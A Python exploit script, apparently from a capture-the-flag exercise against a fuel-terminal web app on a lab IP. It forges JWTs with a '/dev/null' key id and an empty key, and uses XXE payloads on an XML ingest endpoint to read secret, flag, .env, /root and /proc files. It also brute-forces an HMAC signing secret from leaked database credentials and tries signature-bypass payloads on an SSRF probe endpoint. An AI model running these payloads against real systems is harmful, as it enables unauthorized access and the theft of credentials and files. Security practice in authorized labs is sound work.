#!/usr/bin/env python3
"""round73 — Clean retry (no fd reads) + file enumeration + SHA256 test + probe bypass"""
import requests, json, time, hashlib, hmac as hm, base64, re

HOST = "192.168.242.102"
CASPI = f"http://{HOST}:8007"

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_forged(role="operator", sub="ctf", company="X", kid="/dev/null", key=b''):
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":kid},separators=(',',':')).encode()
    p = json.dumps({"sub":sub,"company":company,"role":role,
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(key, m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_forged('operator')}"}

def xxe_read(path, field="remarks", timeout=8):
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>{"&x;" if field=="reference" else "r"}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"&x;" if field=="carrier" else "C"}</carrier>
  <remarks>{"&x;" if field=="remarks" else "R"}</remarks>
</ticket>'''
    try:
        r = requests.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=timeout)
        if r.status_code == 200:
            data = json.loads(r.text)
            return 200, data.get("summary", data.get("ticket", {})).get(field, "")
        return r.status_code, r.text
    except requests.exceptions.Timeout:
        return -1, "TIMEOUT"
    except Exception as e:
        return -2, str(e)

# ============================================================
print("="*70)
print("PHASE 0: SERVER HEALTH CHECK")
print("="*70)

for i in range(3):
    try:
        r = requests.get(f"{CASPI}/api/auth/me", headers=AUTH_OP, timeout=5)
        print(f"  Attempt {i+1}: [{r.status_code}] {r.text[:100]}")
        if r.status_code == 200:
            print("  Server is healthy!")
            break
    except Exception as e:
        print(f"  Attempt {i+1}: {e}")
    time.sleep(2)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 1: SHA256/HMAC CONSTRUCTION TESTS")
print("="*70)
print("  What if probe sig is NOT HMAC-SHA256 but plain SHA256?")

url1 = b"http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow"
sig1 = "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09"
url2 = b"http://gauge-gw.internal:9100/v1/tanks/1/level"
sig2 = "ece8b8f9671e56962dcb233b483c94fd1ea7384ec10d27288925572c6a44c803"

# Test 1: SHA256(url) — no key
h = hashlib.sha256(url1).hexdigest()
print(f"  SHA256(url): {h}")
print(f"  Expected:    {sig1}")
print(f"  Match: {h == sig1}")

# Test 2: MD5(url)
h = hashlib.md5(url1).hexdigest()
print(f"  MD5(url): {h}")

# Test 3: SHA256(url + "\n")
h = hashlib.sha256(url1 + b"\n").hexdigest()
print(f"  SHA256(url+\\n): {h}")
print(f"  Match: {h == sig1}")

# Test 4: SHA1(url)
h = hashlib.sha1(url1).hexdigest()
print(f"  SHA1(url): {h}")

# Test 5: HMAC with empty key (key=b'')
h = hm.new(b'', url1, hashlib.sha256).hexdigest()
print(f"  HMAC-SHA256(empty, url): {h}")
print(f"  Match: {h == sig1}")

# Test 6: HMAC with url as key, empty message
h = hm.new(url1, b'', hashlib.sha256).hexdigest()
print(f"  HMAC-SHA256(url, empty): {h}")

# Test 7: HMAC reversed (url as key, "sign" as msg)
for msg in [b"sign", b"probe", b"lm-01", b"loading-arm-1"]:
    h = hm.new(url1, msg, hashlib.sha256).hexdigest()
    if h == sig1:
        print(f"  *** HMAC-SHA256(url, {msg!r}) MATCHES! ***")

# Test 8: Try common keys that might relate to db.py DATABASE_URL
db_url = "postgresql://terminal_web:terminal_web_pw@terminal-db:5432/terminal"
for key_candidate in [
    db_url,
    "terminal_web_pw",
    "terminal_web",
    "terminal",
    db_url.encode(),
]:
    k = key_candidate.encode() if isinstance(key_candidate, str) else key_candidate
    h = hm.new(k, url1, hashlib.sha256).hexdigest()
    if h == sig1:
        print(f"  *** PROBE_SECRET = {key_candidate!r} ***")
    # Also test with url2
    h2 = hm.new(k, url2, hashlib.sha256).hexdigest()
    if h2 == sig2:
        print(f"  *** CONFIRMED with url2: {key_candidate!r} ***")

print("  No simple hash/HMAC construction match")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 2: PROBE BYPASS — DEVICE NAME INSTEAD OF URL")
print("="*70)

bypass_payloads = [
    {"device": "lm-01"},
    {"device": "tk-01"},
    {"device": "lm-01", "url": "http://127.0.0.1:3000/"},
    {"device": "lm-01", "sig": "anything"},
    {"target": "lm-01"},
    {"name": "lm-01"},
    # Try probe without sig
    {"url": "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow"},
    # Try with empty/null sig
    {"url": "http://gauge-gw.internal:9100/v1/tanks/1/level", "sig": None},
    {"url": "http://gauge-gw.internal:9100/v1/tanks/1/level", "sig": ""},
    {"url": "http://gauge-gw.internal:9100/v1/tanks/1/level", "sig": 0},
    {"url": "http://gauge-gw.internal:9100/v1/tanks/1/level", "sig": False},
    {"url": "http://gauge-gw.internal:9100/v1/tanks/1/level", "sig": []},
]

for payload in bypass_payloads:
    try:
        r = requests.post(f"{CASPI}/api/ops/probe", json=payload,
                         headers=AUTH_OP, timeout=5)
        desc = json.dumps(payload)[:60]
        print(f"  {desc}: [{r.status_code}] {r.text[:150]}")
        if r.status_code == 200 and "body" in r.text:
            print(f"  *** PROBE BYPASS WORKS! ***")
    except Exception as e:
        desc = json.dumps(payload)[:60]
        print(f"  {desc}: {e}")
    time.sleep(0.3)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 3: FILE ENUMERATION — /var/local/ subdirectories")
print("="*70)

enum_paths = [
    # /var/local/ variants (where flags were found)
    "/var/local/probe/secret",
    "/var/local/probe/flag.txt",
    "/var/local/probe/key",
    "/var/local/probe/secret.txt",
    "/var/local/shell/flag.txt",
    "/var/local/shell/secret",
    "/var/local/llehs/flag.txt",
    "/var/local/llehs/secret",
    "/var/local/hmac/key",
    "/var/local/hmac/secret",
    "/var/local/config/probe",
    "/var/local/config/secret",
    "/var/local/key/probe",
    "/var/local/secret/probe",
    "/var/local/flag.txt",
    "/var/local/secret.txt",
    "/var/local/probe.key",
    "/var/local/probe_secret",
    "/var/local/ssrf/flag.txt",
    "/var/local/ssrf/secret",
    "/var/local/rce/flag.txt",
    "/var/local/9000/flag.txt",
    # /opt/
    "/opt/secret",
    "/opt/probe",
    "/opt/flag.txt",
    "/opt/probe_secret",
    "/opt/caspiterminal/secret",
    "/opt/app/secret",
    "/opt/keys/probe",
    # /srv/
    "/srv/secret",
    "/srv/probe",
    "/srv/flag.txt",
    # /home/
    "/home/app/secret",
    "/home/probe/secret",
    # /tmp/ and /run/
    "/tmp/probe_secret",
    "/tmp/secret",
    "/tmp/flag",
    "/run/secrets/PROBE_SECRET",
    "/run/secrets/probe_secret",
    "/run/secrets/probe",
    "/run/secret",
    # /etc/
    "/etc/probe_secret",
    "/etc/secret",
    "/etc/caspiterminal/probe",
    "/etc/app/probe",
    # Docker-injected
    "/.secret",
    "/.probe_secret",
    "/.flag",
    "/secret",
    "/probe_secret",
    "/flag.txt",
    # /app/ deep paths
    "/app/secret",
    "/app/secret.txt",
    "/app/probe_secret",
    "/app/probe_secret.txt",
    "/app/.secret",
    "/app/.probe_secret",
    "/app/config/probe_secret",
    "/app/config/secret",
    "/app/data/secret",
    "/app/keys/secret",
    "/app/keys/hmac",
    "/app/keys/default",
    "/app/keys/sign",
    "/app/keys/signing",
    "/app/.env",
    "/app/.env.local",
    "/app/.env.production",
]

for path in enum_paths:
    code, val = xxe_read(path, timeout=5)
    if code == 200 and val:
        print(f"  *** FOUND: {path} ({len(val)} bytes): {val[:200]} ***")
        # Test as PROBE_SECRET
        for k in [val.encode(), val.strip().encode(), val.encode()+b'\n']:
            h = hm.new(k, url1, hashlib.sha256).hexdigest()
            if h == sig1:
                print(f"  *** !!! PROBE_SECRET = {val!r} !!! ***")
    elif code == 400:
        print(f"  EXISTS (binary): {path}")
    time.sleep(0.1)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 4: /proc/self/maps (RETRY — clean server)")
print("="*70)

code, val = xxe_read("/proc/self/maps", timeout=15)
if code == 200 and val:
    lines = val.split('\n')
    print(f"  /proc/self/maps ({len(val)} bytes, {len(lines)} lines):")
    for line in lines[:40]:
        print(f"    {line}")
    if len(lines) > 40:
        print(f"    ... ({len(lines)-40} more)")

    # Find interesting mapped files
    interesting = [l for l in lines if any(kw in l.lower()
                   for kw in ['app.py', 'auth.py', '/app/', 'probe', 'secret', 'flag'])]
    if interesting:
        print("  *** INTERESTING MAPPINGS ***")
        for l in interesting:
            print(f"    {l}")
elif code == 200:
    print(f"  Empty result!")
elif code == 400:
    print(f"  EXISTS but has special chars")
elif code == -1:
    print(f"  TIMEOUT")
else:
    print(f"  [{code}]")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 5: /proc/self/net/tcp (RETRY)")
print("="*70)

code, val = xxe_read("/proc/self/net/tcp", timeout=10)
if code == 200 and val:
    lines = val.strip().split('\n')
    print(f"  {len(lines)-1} TCP connections:")
    for line in lines[1:]:
        parts = line.split()
        if len(parts) >= 4:
            try:
                local = parts[1]
                remote = parts[2]
                state = parts[3]
                laddr, lport = local.split(':')
                raddr, rport = remote.split(':')
                lip = '.'.join(str(int(laddr[i:i+2], 16)) for i in [6,4,2,0])
                lp = int(lport, 16)
                rip = '.'.join(str(int(raddr[i:i+2], 16)) for i in [6,4,2,0])
                rp = int(rport, 16)
                states = {'01':'ESTAB','0A':'LISTEN','06':'TIME_WAIT','08':'CLOSE_WAIT'}
                st = states.get(state, state)
                print(f"    {lip}:{lp} → {rip}:{rp} [{st}]")
            except:
                print(f"    RAW: {line.strip()}")
else:
    print(f"  [{code}] {val[:200] if val else 'empty'}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 6: KID ORACLE — PATH RESOLUTION TEST (RETRY)")
print("="*70)

# Test if "carrier" resolves to /app/keys/carrier
# Use kid="/dev/null" (empty key) as control
for kid in ["/dev/null", "carrier", "/app/keys/carrier", "operator", "/app/keys/operator"]:
    token = jwt_forged(role="operator", kid=kid, key=b'')
    try:
        r = requests.get(f"{CASPI}/api/auth/me",
                        headers={"Authorization": f"Bearer {token}"}, timeout=5)
        print(f"  kid='{kid}' (key=empty): [{r.status_code}]")
    except Exception as e:
        print(f"  kid='{kid}': {e}")
    time.sleep(0.3)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 7: HTTP TRACE + OPTIONS")
print("="*70)

for method in ["TRACE", "OPTIONS"]:
    for path in ["/", "/api/ops/probe", "/api/auth/me"]:
        try:
            r = requests.request(method, f"{CASPI}{path}",
                headers=AUTH_OP, timeout=5)
            print(f"  [{r.status_code}] {method} {path}:")
            if method == "OPTIONS":
                print(f"    Allow: {r.headers.get('Allow', 'none')}")
                print(f"    Headers: {dict(r.headers)}")
            else:
                print(f"    Body: {r.text[:300]}")
        except Exception as e:
            print(f"  {method} {path}: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 8: CDATA XXE RETRY (FRESH SERVER)")
print("="*70)

# Simple parameter entity test
pe_xml = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [
  <!ENTITY % file SYSTEM "file:///app/app.py">
  <!ENTITY % wrapper "<!ENTITY content '%%file;'>">
  %wrapper;
]>
<ticket>
  <reference>&content;</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier>
  <remarks>R</remarks>
</ticket>'''

try:
    r = requests.post(f"{CASPI}/api/ops/custody/ingest",
        data=pe_xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=10)
    print(f"  Parameter entity: [{r.status_code}] {r.text[:500]}")
except Exception as e:
    print(f"  Error: {e}")

# Try with CDATA approach using local file as DTD
# Create entity that wraps in CDATA
cdata_approaches = [
    # Approach 1: Inline CDATA wrapper
    '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [
  <!ENTITY x SYSTEM "file:///app/app.py">
]>
<ticket>
  <reference><![CDATA[PREFIX]]>&x;</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier>
  <remarks>R</remarks>
</ticket>''',

    # Approach 2: Entity with UTF-7 encoding
    '''<?xml version="1.0" encoding="UTF-7"?>
<!DOCTYPE ticket [
  <!ENTITY x SYSTEM "file:///app/app.py">
]>
<ticket>
  <reference>&x;</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier>
  <remarks>R</remarks>
</ticket>''',
]

for i, xml in enumerate(cdata_approaches):
    try:
        r = requests.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml.encode('utf-8'),
            headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=10)
        print(f"  Approach {i+1}: [{r.status_code}] {r.text[:300]}")
    except Exception as e:
        print(f"  Approach {i+1}: {e}")
    time.sleep(0.5)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 9: TEMPLATE ENUMERATION (RETRY)")
print("="*70)

# Only templates that DON'T start with HTML tags might be readable
# (templates starting with {% extends ... %} might work)
templates = [
    "/app/templates/portal.html",
    "/app/templates/services.html",
    "/app/templates/loading.html",
    "/app/templates/custody.html",
    "/app/templates/probe.html",
    "/app/templates/tanks.html",
    "/app/templates/devices.html",
    "/app/templates/error.html",
    # Non-HTML templates
    "/app/templates/email.txt",
    "/app/templates/ticket.txt",
    "/app/templates/receipt.txt",
    # Partials
    "/app/templates/partials/nav.html",
    "/app/templates/partials/header.html",
    "/app/templates/includes/probe.html",
    "/app/templates/components/tank.html",
]

for path in templates:
    code, val = xxe_read(path, timeout=5)
    if code == 200 and val:
        print(f"\n  *** {path} ({len(val)} bytes): ***")
        print(f"    {val[:400]}")
        # Check for API references
        apis = re.findall(r'/api/[a-zA-Z0-9/_?&=.-]+', val)
        if apis: print(f"    APIs: {apis}")
    elif code == 400:
        print(f"  {path}: EXISTS (400)")
    time.sleep(0.2)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 10: INTERESTING ENV/CONFIG PATHS")
print("="*70)

config_paths = [
    "/etc/environment",
    "/root/.bashrc",
    "/root/.profile",
    "/.dockerenv",
    "/proc/1/comm",
    "/proc/1/cgroup",
    "/proc/1/oom_score",
    # Gunicorn PID files
    "/var/run/gunicorn.pid",
    "/tmp/gunicorn.pid",
    "/app/gunicorn.pid",
    # Python startup
    "/usr/local/lib/python3.11/site.py",
    # Docker compose might be mounted
    "/app/docker-compose.yml",
    "/app/docker-compose.yaml",
    "/app/Dockerfile",
    # Any txt/md files in /app
    "/app/README.md",
    "/app/README.txt",
    "/app/README",
    "/app/FLAG",
    "/app/flag.txt",
    "/app/PROBE_SECRET",
    "/app/notes.txt",
    "/app/TODO",
]

for path in config_paths:
    code, val = xxe_read(path, timeout=5)
    if code == 200 and val:
        print(f"  *** {path} ({len(val)} bytes): {val[:300]} ***")
    elif code == 400:
        print(f"  {path}: EXISTS (400)")
    time.sleep(0.1)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 11: PROBE/SIGN — FULL RESPONSE ANALYSIS")
print("="*70)

# Get fresh probe signatures and analyze response headers
for device in ["lm-01", "tk-01", "tk-07"]:
    try:
        r = requests.get(f"{CASPI}/api/ops/probe/sign",
                        params={"device": device},
                        headers=AUTH_OP, timeout=5)
        print(f"  {device}: [{r.status_code}]")
        print(f"    Body: {r.text[:200]}")
        print(f"    Headers: {dict(r.headers)}")

        if r.status_code == 200:
            data = r.json()
            url_val = data.get("url", "")
            sig_val = data.get("sig", "")
            # Any extra fields?
            extra = {k: v for k, v in data.items() if k not in ["url", "sig"]}
            if extra:
                print(f"    *** EXTRA FIELDS: {extra} ***")
    except Exception as e:
        print(f"  {device}: {e}")
    time.sleep(0.3)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 12: PROBE RESPONSES — FULL HEADERS FROM GAUGE-GW")
print("="*70)

probe_data = {
    "url": "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow",
    "sig": "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09"
}
try:
    r = requests.post(f"{CASPI}/api/ops/probe", json=probe_data,
                     headers=AUTH_OP, timeout=10)
    print(f"  [{r.status_code}]")
    print(f"  Full response: {r.text}")
    print(f"  Response headers: {dict(r.headers)}")
    # Check if response includes headers from gauge-gw
    if r.status_code == 200:
        data = r.json()
        for key in data:
            if key not in ["body", "status"]:
                print(f"  *** EXTRA FIELD: {key} = {data[key]} ***")
except Exception as e:
    print(f"  Error: {e}")

print("\n"+"="*70)
print("DONE")
print("="*70)
